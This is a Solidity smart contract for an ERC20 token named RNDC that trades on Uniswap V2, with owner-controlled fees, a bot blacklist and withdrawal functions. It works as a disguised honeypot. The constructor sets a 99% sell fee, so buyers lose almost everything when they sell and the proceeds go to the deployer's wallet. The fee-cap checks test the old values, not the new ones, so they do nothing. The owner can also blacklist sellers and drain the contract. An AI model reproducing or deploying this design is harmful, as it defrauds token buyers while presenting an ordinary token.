// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./ERC20.sol";
import "./Ownable.sol";
 
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
 
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function factory() external pure returns (address);
 
    function WETH() external pure returns (address);
}

contract RNDC is ERC20, Ownable {
    IUniswapV2Router02 public constant uniV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public immutable uniV2Pair;

    address public markettingWallet;

    uint256 public buyFee;
    uint256 public sellFee;

    uint256 public maxTradeAmount;
    uint256 public maxFeeSwapAmount;

    mapping(address => bool) public isFeeExcluded;
    mapping(address => bool) public isBot;

    constructor() ERC20("RNDCName", "RNDCSymbol") {
        _mint(msg.sender, 10_000_000_000 * (10 ** decimals())); // 10 billion tokens

        uniV2Pair = IUniswapV2Factory(uniV2Router.factory()).createPair(address(this), uniV2Router.WETH());

        approve(address(uniV2Router), type(uint256).max);
    
        setMarkettingWallet(msg.sender);
        setFees(3, 99);

        excludeAccountFromFees(msg.sender);
        excludeAccountFromFees(address(this));
    }

    function setMarkettingWallet(address _markettingWallet) public onlyOwner {
        markettingWallet = _markettingWallet;
        excludeAccountFromFees(markettingWallet);
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) public onlyOwner {
        require(buyFee < 100, "Buy fee too high");
        require(sellFee < 100, "Sell fee too high");

        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function setMaxTradeAmount(uint256 _maxTradeAmount) external onlyOwner {
        maxTradeAmount = _maxTradeAmount;
    }

    function setMaxFeeSwapAmount(uint256 _maxFeeSwapAmount) external onlyOwner {
        maxFeeSwapAmount = _maxFeeSwapAmount;
    }

    function excludeAccountFromFees(address account) public onlyOwner {
        isFeeExcluded[account] = true;
    }

    function includeAccountToFees(address account) external onlyOwner {
        isFeeExcluded[account] = false;
    }

    function listBots(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isBot[accounts[i]] = true;
        }
    }

    function delistBots(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isBot[accounts[i]] = false;
        }
    }

    /*require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
 
        if (from != owner() && to != owner()) {
 
            //Trade start check
            if (!tradingOpen) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
 
            require(amount <= _maxTxAmount, "TOKEN: Max Transaction Limit");
            require(!bots[from] && !bots[to], "TOKEN: Your account is blacklisted!");
 
            if(to != uniswapV2Pair) {
                require(balanceOf(to) + amount < _maxWalletSize, "TOKEN: Balance exceeds wallet size!");
            }
 
            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
 
            if(contractTokenBalance >= _maxTxAmount)
            {
                contractTokenBalance = _maxTxAmount;
            }
 
            if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
 
        bool takeFee = true;
 
        //Transfer Tokens
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            takeFee = false;
        } else {
 
            //Set Fee for Buys
            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnBuy;
                _taxFee = _taxFeeOnBuy;
            }
 
            //Set Fee for Sells
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnSell;
                _taxFee = _taxFeeOnSell;
            }
 
        }
 
        _tokenTransfer(from, to, amount, takeFee);
    }
 
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }*/

    function swapFeesForEth() private {
        uint256 amount = balanceOf(address(this));
        if (amount > maxFeeSwapAmount) amount = maxFeeSwapAmount;
        if (amount == 0) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            markettingWallet,
            block.timestamp
        );
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(!isBot[sender], "This bot is blocked");

        bool buying = sender == uniV2Pair && !isFeeExcluded[recipient];
        bool selling = recipient == uniV2Pair && !isFeeExcluded[sender];

        if (buying || selling) {
            require(maxTradeAmount > 0, "Trading not enabled yet");
            require(amount <= maxTradeAmount, "Max trade amount exceeded");
        }

        uint256 feePct;
        if (buying) feePct = buyFee;
        else if (selling) feePct = sellFee;
        uint256 fees = amount * feePct / 100;
        amount = amount - fees;
        super._transfer(sender, address(this), fees);
        if (selling) swapFeesForEth();
        
        super._transfer(sender, recipient, amount);
    }

    function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {
        IERC20(tokenAddress).transfer(owner(), tokenAmount);
    }

    function recoverETH(uint256 amount) external onlyOwner {
        payable(owner()).transfer(amount);
    }

    receive() external payable {}
}